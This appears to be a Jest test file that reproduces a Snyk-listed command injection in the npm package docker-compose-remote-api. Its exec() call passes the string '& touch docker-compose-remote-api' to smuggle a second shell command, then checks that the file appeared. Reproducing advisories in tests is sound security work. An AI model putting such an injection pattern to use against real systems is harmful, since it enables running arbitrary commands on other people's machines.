//https://snyk.io/vuln/SNYK-JS-DOCKERCOMPOSEREMOTEAPI-560125
test("Command Injection in docker-compose-remote-api", () => 
{
	const Root = require("docker-compose-remote-api");
	const fs = require('fs');
	const path = './docker-compose-remote-api';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	try
	{
		var root = Root({cwd:__dirname}).exec("& touch docker-compose-remote-api");
	}
	catch(error)
	{
		console.log(" ")
	}	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
